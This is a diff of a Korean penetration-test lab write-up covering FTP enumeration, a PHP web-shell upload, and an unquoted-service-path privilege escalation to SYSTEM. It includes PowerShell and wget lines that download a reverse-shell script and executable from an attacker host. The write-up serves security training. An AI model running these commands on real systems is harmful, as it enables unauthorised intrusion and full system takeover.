@@ -111,9 +111,11 @@ Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
 기초적인 웹 정보 수집을 위해 포트 8080을 방문하니 `Under Construction`이라는 문구와 함께 기초적인 랜딩 페이지가 나왔다.
 
 FTP서버에 익명 로그인으로 직접 접근해봤을 때, index.php, upload.php가 있음을 확인한다. 
+
 ![](Pasted%20image%2020240728002947.png)
 
 서버의 소스코드가 나옴을 알 수 있지만, 어느 경로인지 확인되지 않았으므로 자세한 정보수집을 위해 웹서버에 접속한다.
+
 ![](Pasted%20image%2020240728003400.png)
 
 ### 취약점 진단
@@ -132,9 +134,11 @@ gobuster dir -u http://10.0.4.20/ -w /usr/share/dirb/wordlists/common.txt -t 20 
 ![](Pasted%20image%2020240728005627.png)
 
 실제로 파일 업로드가 가능함을 확인한다. php 확장자 파일 업로드 우회를 시도해보았으나, 불가능한 것은 물론 파일 업로드 후, 정확한 업로드 파일 경로를 알 수가 없는 상태다.
+
 ![](Pasted%20image%2020240728003947.png)
 
 하지만 해당 파일의 업로드 여부와 상관없이, FTP서버의 디렉토리가 웹서버 /staging/ 디렉토리와 공유중이기 때문에, 해당 php 파일의 소스코드를 확인이 가능하며, 악성 파일 업로드까지 가능하다. 
+
 ![](Pasted%20image%2020240728005202.png)
 
 
@@ -149,6 +153,7 @@ gobuster dir -u http://10.0.4.20/ -w /usr/share/dirb/wordlists/common.txt -t 20 
 ```
 
 업로드가 된 파일 경로로 직접 접속하여 `cmd` 파라미터 값에 시스템 명령어를 입력하여  응답값을 받는다. POST 메소드를 이용하여 요청하기 위해 웹 프록시를 이용한다.
+
 
 ![](Pasted%20image%2020240728005534.png)
 
@@ -166,6 +171,7 @@ powershell IEX(IWR http://10.0.4.25/Invoke-ConPtyShell.ps1 -UseBasicParsing); In
 ```
 
 웹 서비스 계정인 xampp 유저로 들어올 수 있다.
+
 ![](Pasted%20image%2020240728083650.png)
 
 
@@ -183,6 +189,7 @@ Get-WmiObject Win32_Service | Where-object {$_.Startmode -eq 'Auto' -and $_.path
 서비스를 실행 시킬 때, 윈도우 API 함수의 특성상, 서비스 실행 경로 중간(`C:\utils\Remote System Monitor Server\`)에 공백이 있다면. Remote.exe 와 같이 .exe 를 붙여 실행하기 때문에 이러한 탐색 방식을 악용하여 Remote.exe 라는 이름의 악성 파일 업로드를 시도한다.
 
 이를 구현하기 위해 `icacls`로 해당 경로`c:\utils`에 유저의 쓰기권한이 있는지 확인한다.  
+
 ![](Pasted%20image%2020240728012607.png)
 
 공격자 호스트에서 리버스쉘을 제작한 후, 대상 호스트의 `c:\utils\Remote.exe` 경로로 전송한다.
@@ -200,6 +207,7 @@ wget http://10.0.4.25/Remote.exe -OutFile c:\utils\Remote.exe
 
 
 SYSTEM 권한을 통해 서비스를 재실행시키므로, SYSTEM 유저로 리버스 쉘을 연결받은 것을 확인한다.
+
 ![](Pasted%20image%2020240727130103.png)
 
 SYSTEM 권한으로 설정된 쉘을 획득했다. 이 권한 상승을 통해 Host1 의 제어권을 확보했고, 모의 침투 테스트는 여기서 마무리됐다. 테스트 과정에서 발견된 취약점들은 다음 섹션에 문서화했다.
